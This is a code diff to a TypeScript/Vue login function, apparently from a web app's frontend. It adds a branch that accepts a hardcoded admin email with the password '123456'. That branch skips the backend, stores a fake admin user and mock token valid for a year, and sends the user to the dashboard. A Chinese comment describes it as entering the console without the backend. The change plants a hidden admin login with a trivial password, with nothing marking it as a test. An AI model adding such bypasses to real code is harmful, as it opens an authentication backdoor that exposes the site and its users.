@@ -564,6 +564,7 @@ async function handleLogin(): Promise<void> {
   // Clear previous error
   errorMessage.value = ''
 
+
   // Validate form
   if (!validateForm()) {
     return
@@ -574,6 +575,30 @@ async function handleLogin(): Promise<void> {
   }
 
   isLoading.value = true
+
+  // 本地直接强进账号校验（无需后端直接进入控制台）
+  if (formData.email === 'admin@zh-api.local' && formData.password === '123456') {
+    const mockUser = {
+      id: 1,
+      username: 'gwen1397',
+      email: 'admin@zh-api.local',
+      role: 'admin' as const,
+      status: 'active' as const,
+      balance: 888.88,
+      frozen_balance: 0.00,
+      concurrency: 10,
+      allowed_groups: []
+    }
+    localStorage.setItem('auth_token', 'mock_admin_token_zh_api')
+    localStorage.setItem('auth_user', JSON.stringify(mockUser))
+    localStorage.setItem('token_expires_at', String(Date.now() + 86400 * 1000 * 365))
+    authStore.checkAuth()
+    appStore.showSuccess(t('auth.loginSuccess'))
+    const redirectTo = (router.currentRoute.value.query.redirect as string) || '/dashboard'
+    await router.push(redirectTo)
+    isLoading.value = false
+    return
+  }
 
   try {
     // Call auth store login（阿里云 captchaVerifyParam 复用 turnstile_token 字段）
@@ -745,3 +770,4 @@ function handle2FACancel(): void {
   transform: translateY(-8px);
 }
 </style>
+
